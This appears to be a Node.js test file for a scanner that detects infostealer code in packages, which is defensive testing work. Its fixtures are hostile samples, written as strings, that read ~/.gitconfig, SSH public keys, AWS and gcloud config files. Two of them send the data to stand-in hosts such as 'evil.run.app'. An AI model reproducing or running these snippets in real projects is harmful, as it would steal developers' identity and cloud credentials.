import { test } from 'node:test';
import assert from 'assert/strict';
import { scan } from '../backend/detectors/tier1-infostealer.js';

test('TIER1-INFOSTEALER: identity_recon_exfil — .gitconfig read detected', async () => {
  const files = [
    {
      path: 'postinstall.js',
      content: `const fs = require('fs'); const data = fs.readFileSync(process.env.HOME + '/.gitconfig', 'utf8'); console.log(data);`,
    },
  ];
  const findings = await scan({}, files, null, files);
  assert(findings.length > 0);
  assert.equal(findings[0].subtype, 'identity_recon_exfil');
  assert.ok(findings[0].evidence.some((e) => e.includes('identity/credential-adjacent path')));
});

test('TIER1-INFOSTEALER: identity_recon_exfil — .ssh/*.pub read detected', async () => {
  const files = [
    {
      path: 'scan.js',
      content: `const fs = require('fs'); const keys = fs.readdirSync(process.env.HOME + '/.ssh').filter(f => f.endsWith('.pub')); for (const k of keys) { console.log(fs.readFileSync(process.env.HOME + '/.ssh/' + k, 'utf8')); }`,
    },
  ];
  const findings = await scan({}, files, null, files);
  assert(findings.length > 0);
  assert.equal(findings[0].subtype, 'identity_recon_exfil');
});

test('TIER1-INFOSTEALER: identity_recon_exfil — .aws/config read detected', async () => {
  const files = [
    {
      path: 'install.js',
      content: `const fs = require('fs'); const cfg = fs.readFileSync(process.env.HOME + '/.aws/config', 'utf8');`,
    },
  ];
  const findings = await scan({}, files, null, files);
  assert(findings.length > 0);
  assert.equal(findings[0].subtype, 'identity_recon_exfil');
});

test('TIER1-INFOSTEALER: identity_recon_exfil — /etc/resolv.conf read detected', async () => {
  const files = [
    {
      path: 'setup.js',
      content: `const fs = require('fs'); const resolv = fs.readFileSync('/etc/resolv.conf', 'utf8');`,
    },
  ];
  const findings = await scan({}, files, null, files);
  assert(findings.length > 0);
  assert.equal(findings[0].subtype, 'identity_recon_exfil');
});

test('TIER1-INFOSTEALER: identity_recon_exfil — git config exec detected', async () => {
  const files = [
    {
      path: 'install.js',
      content: `const { execSync } = require('child_process'); const email = execSync('git config user.email').toString(); const host = require('os').hostname(); require('https').request({ hostname: 'evil.run.app', path: '/c', method: 'POST' }, () => {}).end(JSON.stringify({email, host}));`,
    },
  ];
  const findings = await scan({}, files, null, files);
  assert(findings.length > 0);
  assert.ok(
    findings[0].subtype === 'identity_recon_exfil' ||
      findings[0].evidence.some((e) => e.includes('git config exec'))
  );
});

test('TIER1-INFOSTEALER: identity_recon_exfil — .config/gcloud/properties read detected', async () => {
  const files = [
    {
      path: 'scan.js',
      content: `const fs = require('fs'); const cfg = fs.readFileSync(process.env.HOME + '/.config/gcloud/properties', 'utf8');`,
    },
  ];
  const findings = await scan({}, files, null, files);
  assert(findings.length > 0);
  assert.equal(findings[0].subtype, 'identity_recon_exfil');
});

test('TIER1-INFOSTEALER: PaaS domain in exfil target boosts score', async () => {
  const files = [
    {
      path: 'exfil.js',
      content: `const fs = require('fs'); const data = fs.readFileSync(process.env.HOME + '/.gitconfig', 'utf8'); fetch('https://collector-x7k2m.run.app/upload', { method: 'POST', body: data });`,
    },
  ];
  const findings = await scan({}, files, null, files);
  assert(findings.length > 0);
  assert.ok(findings[0].evidence.some((e) => e.includes('paas_domain')));
});

test('TIER1-INFOSTEALER: identity_recon_exfil scores HIGH without credential regex', async () => {
  const files = [
    {
      path: 'recon.js',
      content: `const fs = require('fs'); const gitconfig = fs.readFileSync(process.env.HOME + '/.gitconfig', 'utf8'); const sshPub = fs.readFileSync(process.env.HOME + '/.ssh/id_rsa.pub', 'utf8'); const awsConfig = fs.readFileSync(process.env.HOME + '/.aws/config', 'utf8');`,
    },
  ];
  const findings = await scan({}, files, null, files);
  assert(findings.length > 0);
  assert.equal(findings[0].subtype, 'identity_recon_exfil');
  assert.ok(findings[0].confidenceScore >= 80);
});

test('TIER1-INFOSTEALER: clean code with no identity paths returns no findings', async () => {
  const files = [
    {
      path: 'app.js',
      content: `const fs = require('fs'); const data = fs.readFileSync('./data.json', 'utf8'); console.log(JSON.parse(data));`,
    },
  ];
  const findings = await scan({}, files, null, files);
  assert.equal(findings.length, 0);
});
